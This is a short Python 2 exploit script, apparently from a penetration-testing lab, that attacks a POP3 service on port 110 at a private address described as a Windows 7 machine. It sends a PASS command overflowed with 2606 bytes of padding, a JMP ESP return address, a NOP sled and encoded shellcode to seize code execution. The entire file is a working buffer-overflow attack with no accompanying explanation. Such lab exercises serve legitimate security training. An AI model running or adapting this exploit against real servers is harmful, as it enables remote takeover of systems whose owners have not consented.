#!/usr/bin/python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

shellcode = ("\xdd\xc4\xd9\x74\x24\xf4\xbb\x45\xae\xbd\xcc\x5d\x2b\xc9\xb1"
"\x52\x31\x5d\x17\x03\x5d\x17\x83\xa8\x52\x5f\x39\xce\x43\x22"
"\xc2\x2e\x94\x43\x4a\xcb\xa5\x43\x28\x98\x96\x73\x3a\xcc\x1a"
"\xff\x6e\xe4\xa9\x8d\xa6\x0b\x19\x3b\x91\x22\x9a\x10\xe1\x25"
"\x18\x6b\x36\x85\x21\xa4\x4b\xc4\x66\xd9\xa6\x94\x3f\x95\x15"
"\x08\x4b\xe3\xa5\xa3\x07\xe5\xad\x50\xdf\x04\x9f\xc7\x6b\x5f"
"\x3f\xe6\xb8\xeb\x76\xf0\xdd\xd6\xc1\x8b\x16\xac\xd3\x5d\x67"
"\x4d\x7f\xa0\x47\xbc\x81\xe5\x60\x5f\xf4\x1f\x93\xe2\x0f\xe4"
"\xe9\x38\x85\xfe\x4a\xca\x3d\xda\x6b\x1f\xdb\xa9\x60\xd4\xaf"
"\xf5\x64\xeb\x7c\x8e\x91\x60\x83\x40\x10\x32\xa0\x44\x78\xe0"
"\xc9\xdd\x24\x47\xf5\x3d\x87\x38\x53\x36\x2a\x2c\xee\x15\x23"
"\x81\xc3\xa5\xb3\x8d\x54\xd6\x81\x12\xcf\x70\xaa\xdb\xc9\x87"
"\xcd\xf1\xae\x17\x30\xfa\xce\x3e\xf7\xae\x9e\x28\xde\xce\x74"
"\xa8\xdf\x1a\xda\xf8\x4f\xf5\x9b\xa8\x2f\xa5\x73\xa2\xbf\x9a"
"\x64\xcd\x15\xb3\x0f\x34\xfe\x7c\x67\x0e\x86\x14\x7a\x6e\x77"
"\x5e\xf3\x88\x1d\xb0\x52\x03\x8a\x29\xff\xdf\x2b\xb5\xd5\x9a"
"\x6c\x3d\xda\x5b\x22\xb6\x97\x4f\xd3\x36\xe2\x2d\x72\x48\xd8"
"\x59\x18\xdb\x87\x99\x57\xc0\x1f\xce\x30\x36\x56\x9a\xac\x61"
"\xc0\xb8\x2c\xf7\x2b\x78\xeb\xc4\xb2\x81\x7e\x70\x91\x91\x46"
"\x79\x9d\xc5\x16\x2c\x4b\xb3\xd0\x86\x3d\x6d\x8b\x75\x94\xf9"
"\x4a\xb6\x27\x7f\x53\x93\xd1\x9f\xe2\x4a\xa4\xa0\xcb\x1a\x20"
"\xd9\x31\xbb\xcf\x30\xf2\xcb\x85\x18\x53\x44\x40\xc9\xe1\x09"
"\x73\x24\x25\x34\xf0\xcc\xd6\xc3\xe8\xa5\xd3\x88\xae\x56\xae"
"\x81\x5a\x58\x1d\xa1\x4e")

# Exploit string: 2606 As + JMP ESP memory address + nops + shellcode
buffer="A" * 2606 + "\x8f\x35\x4a\x5f" + "\x90" * 16 + shellcode
try: 
	print "\nSending buffer..."
# Connect to Windows 7 machine
	s.connect(('192.168.56.102',110))
	data = s.recv(1024)
	s.send('USER username'+ '\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	s.close()
	print "\ Done."
except:
	print "Could not connect!"

